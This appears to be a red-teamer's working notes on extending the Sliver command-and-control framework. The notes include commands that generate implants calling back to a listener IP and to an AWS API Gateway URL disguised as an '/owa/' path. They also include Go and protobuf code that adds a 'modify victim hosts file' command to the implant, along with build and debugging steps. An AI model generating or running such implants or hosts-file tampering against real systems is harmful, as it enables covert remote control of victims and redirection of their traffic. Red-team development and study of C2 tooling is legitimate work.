Run Sliver Server Client for Debug

Generate player:
new-operator -n jose -l 192.168.68.127
multiplayer

Import:
cd ~/Documents/Tools/SliverX/
./sliver-client import server/jose_192.168.68.127.cfg

Payload
http -l 8080
generate --http http://172.20.10.14:8080 -d --skip-symbols

generate --http https://rhm5pq30wg.execute-api.us-east-1.amazonaws.com/owa/ --skip-symbols




dlv exec --api-version 2 --headless --listen 172.20.10.13:5555 --log .\SAFE_CANVAS.exe


----------------------

Code modifications:

    sliver.proto:

    message HelloWorldReq {
    string param1 = 1;
    uint32 param2 = 2;
    bool param3 = 3;
    commonpb.Request Request = 9;
    }

    message HelloWorld {
    string output = 1;
    commonpb.Response Response = 9;
    }

    message ModifyHostsFileReq {
    string domainName = 1;
    string ipaddress = 2;
    commonpb.Request Request = 9;  
    }

    message ModifyHostsFile {
    string output = 1;
    commonpb.Response Response = 9;
    }

    sliver.go:


        // [ Hello World] ------------------------------------------
        helloWorldCmd := &cobra.Command{
            Use:   consts.HelloWorldStr,
            Short: "Hello World command",
            Long:  help.GetHelpFor([]string{consts.HelloWorldStr}),
            Args:  cobra.ExactArgs(1),
            Run: func(cmd *cobra.Command, args []string) {
            helloworld.HelloWorldCmd(cmd, con, args)
            },
            GroupID: consts.FilesystemHelpGroup,
        }
        sliver.AddCommand(helloWorldCmd)
        Flags("", false, helloWorldCmd, func(f *pflag.FlagSet) {
            f.Uint32P("intflag", "i", 0, "parameter 2")
            f.BoolP("boolflag", "x", false, "parameter 3")
            f.Int64P("timeout", "t", defaultTimeout, "grpc timeout in seconds")
        })
        carapace.Gen(helloWorldCmd).PositionalCompletion(
        carapace.ActionValues().Usage("parameter1")
        )

        // [ Modify Hosts File] ------------------------------------------
        modifyHostsFileCmd := &cobra.Command{
            Use:   consts.ModifyHostsFileStr,
            Short: "Modify victim hosts file command",
            Long:  help.GetHelpFor([]string{consts.ModifyHostsFileStr}),
            Args:  cobra.ExactArgs(1),
            Run: func(cmd *cobra.Command, args []string) {
            modifyhostsfile.ModifyHostsFileCmd(cmd, con, args)
            },
            GroupID: consts.FilesystemHelpGroup,
        }
        sliver.AddCommand(modifyHostsFileCmd)
        Flags("", false, modifyHostsFileCmd, func(f *pflag.FlagSet) {
            f.StringP("domain", "d", "", "domain to add")
            f.StringP("ipaddress", "i", "", "ip address to add")
            f.Int64P("timeout", "t", defaultTimeout, "grpc timeout in seconds")
        })
        carapace.Gen(modifyHostsFileCmd).PositionalCompletion(
        carapace.ActionValues().Usage("hostsfile")
        )


New file modifyhostsfile.go:

        package modifyhostsfile

        import (
            "context"

            "google.golang.org/protobuf/proto"

            "github.com/spf13/cobra"

            "github.com/bishopfox/sliver/client/console"
            "github.com/bishopfox/sliver/protobuf/clientpb"
            "github.com/bishopfox/sliver/protobuf/sliverpb"
        )

        func ModifyHostsFileCmd(cmd *cobra.Command, con *console.SliverConsoleClient, args []string) (err error) {
            session, beacon := con.ActiveTarget.GetInteractive()
            if session == nil && beacon == nil {
                return
            }

            if len(args) != 2 {
                con.PrintErrorf("Please specify a domain and an ip.\n")
                return
            }

            param1 := args[0]
            param2 := args[1]

            out, err := con.Rpc.ModifyHostsFile(context.Background(), &sliverpb.ModifyHostsFileReq{
                Request:    con.ActiveTarget.Request(cmd),
                DomainName: param1,
                Ipaddress:  param2,
            })
            if err != nil {
                con.PrintErrorf("%s\n", err)
                return
            }

            if out.Response != nil && out.Response.Async {
                con.AddBeaconCallback(out.Response.TaskID, func(task *clientpb.BeaconTask) {
                    err = proto.Unmarshal(task.Response, out)
                    if err != nil {
                        con.PrintErrorf("Failed to decode response %s\n", err)
                        return
                    }

                    PrintHostsFile(out, con)
                })
                con.PrintAsyncResponse(out.Response)
            } else {
                PrintHostsFile(out, con)
            }

            return
        }

        func PrintHostsFile(hw *sliverpb.ModifyHostsFile, con *console.SliverConsoleClient) {
            if hw.Response != nil && hw.Response.Err != "" {
                con.PrintErrorf("%s\n", hw.Response.Err)
                return
            }

            con.PrintInfof("Here the output coming from the implant: %s\n", hw.Output)
        }


------------------

standard:

helloworld - modifyhostsfile
helloWorld - modifyHostsFile
HelloWorld - ModifyHostsFile

call:

modifyhostsfile new -d jose.com -i 1.2.3.4 -t 40000

Implant handler

Files touched:

implant/sliver/handlers/handlers_windows.go 
protobuf/sliverpb/constants.go


Running the server:

cd //SliverX/
make
go run -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.1.2 -X github.com/bishopfox/sliver/client/version.CompiledAt=Never -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=aabbcc -X github.com/bishopfox/sliver/client/version.GitDirty=Dirty" -tags osusergo,netgo,go_sqlite,server ./server/main.go
go run -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.0.0 -X github.com/bishopfox/sliver/client/version.CompiledAt=November -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=HostFileChanger -X github.com/bishopfox/sliver/client/version.GitDirty=RedTeam" -tags osusergo,netgo,go_sqlite,server ./server/main.go

to build:
server
go build -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.0.0 -X github.com/bishopfox/sliver/client/version.CompiledAt=November -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=HostFileChanger -X github.com/bishopfox/sliver/client/version.GitDirty=RedTeam" -tags osusergo,netgo,go_sqlite,server ./server/main.go

client
go build -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.0.0 -X github.com/bishopfox/sliver/client/version.CompiledAt=November -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=HostFileChanger -X github.com/bishopfox/sliver/client/version.GitDirty=RedTeam" -tags osusergo,netgo,go_sqlite,server ./client/main.go